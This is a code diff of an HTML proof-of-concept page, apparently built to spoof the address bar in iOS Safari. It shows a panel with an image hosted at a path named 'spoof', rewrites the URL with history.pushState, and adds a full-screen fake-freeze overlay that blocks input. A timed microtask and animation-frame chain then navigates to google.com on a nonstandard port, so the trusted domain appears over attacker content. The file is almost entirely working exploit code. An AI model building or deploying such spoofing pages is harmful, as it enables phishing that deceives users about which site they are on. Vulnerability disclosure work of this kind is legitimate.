@@ -2,40 +2,147 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>iOS Safari Timing PoC</title>
+<title>POC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+
 <style>
   body {
-    font-family: system-ui, -apple-system, sans-serif;
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, system-ui;
+    background: #f5f5f7;
   }
-  #demo {
+
+  button {
+    margin: 40px;
+    font-size: 18px;
+    padding: 10px 18px;
+  }
+
+  #panel {
     display: none;
-    margin-top: 20px;
-    padding: 16px;
-    border: 2px solid #0a84ff;
+    padding: 24px;
+    max-width: 420px;
+    margin: 60px auto;
+    background: #fff;
+    border-radius: 14px;
+    box-shadow: 0 20px 60px rgba(0,0,0,.15);
+    position: relative;
+    z-index: 1;
   }
+
+  h2 {
+    margin: 0 0 8px;
+    text-align: center;
+  }
+
+  .sub {
+    color: #666;
+    margin-bottom: 16px;
+    text-align: center;
+  }
+
+  .content {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .content img {
+    max-width: 90%;
+    height: auto;
+    border-radius: 12px;
+    box-shadow: 0 12px 40px rgba(0,0,0,.25);
+  }
+
+  .spinner {
+    width: 28px;
+    height: 28px;
+    border: 3px solid #ddd;
+    border-top-color: #007aff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
   #timer {
-    font-size: 22px;
-    font-weight: bold;
+    margin-top: 16px;
+    font-weight: 600;
+    text-align: center;
+  }
+
+  /* ===== FREEZE OVERLAY ===== */
+  #freeze {
+    position: fixed;
+    inset: 0;
+    background: rgba(255,255,255,0.96);
+    display: none;
+    z-index: 9999;
+    pointer-events: all;
+  }
+
+  #freeze .box {
+    position: absolute;
+    top: 45%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+  }
+
+  #freeze .text {
+    font-size: 18px;
+    font-weight: 600;
+    color: #333;
   }
 </style>
 </head>
 
 <body>
 
-<button id="trigger">Trigger</button>
+<button id="trigger">POC</button>
 
-<div id="demo">
-  <h2>Demo</h2>
+<div id="panel">
+  <h2>POC</h2>
+  <div class="sub">POC</div>
+
+  <!-- CONTENT DIGABUNG -->
+  <div class="content">
+    <h2>𝐷ℎ𝑎𝑓𝑦</h2>
+    <a href="https://example.com" target="_blank" rel="noopener noreferrer">
+      <img
+        src="https://ecdnts-del.github.io/spoof/9de3dae67d67214fee46527f2a5b8d6b.jpg"
+        alt="POC Image">
+    </a>
+  </div>
+
+  <div class="spinner"></div>
   <div id="timer">0 ms</div>
+</div>
+
+<!-- FREEZE OVERLAY -->
+<div id="freeze">
+  <div class="box">
+    <div class="text">POC</div>
+  </div>
 </div>
 
 <script>
 document.getElementById('trigger').addEventListener('click', () => {
-  const demo  = document.getElementById('demo');
-  const timer = document.getElementById('timer');
+  const panel  = document.getElementById('panel');
+  const timer  = document.getElementById('timer');
+  const freeze = document.getElementById('freeze');
 
-  demo.style.display = 'block';
+  // address bar manipulation (UNCHANGED)
+  history.pushState({}, '', '/poc');
+
+  panel.style.display = 'block';
+
+  // fake freeze (UNCHANGED)
+  freeze.style.display = 'block';
+  document.body.style.pointerEvents = 'none';
 
   const start = performance.now();
   let rafId;
@@ -46,22 +153,25 @@ document.getElementById('trigger').addEventListener('click', () => {
     rafId = requestAnimationFrame(tick);
   }
 
-  // double RAF → paint confirmed (WebKit friendly)
+  // paint confirmation (UNCHANGED)
   requestAnimationFrame(() => {
     requestAnimationFrame(tick);
   });
 
-  // promise chain keeps user activation alive slightly longer
+  // microtask chain + RAF redirect (UNCHANGED)
   Promise.resolve()
     .then(() => Promise.resolve())
     .then(() => Promise.resolve())
     .then(() => {
-      cancelAnimationFrame(rafId);
-      location.href = 'https://google.com:9090';
+      requestAnimationFrame(() => {
+        cancelAnimationFrame(rafId);
+        location.href = 'http://GOOGLE.com:9000';
+      });
     });
 });
 </script>
 
 </body>
 </html>
+
 
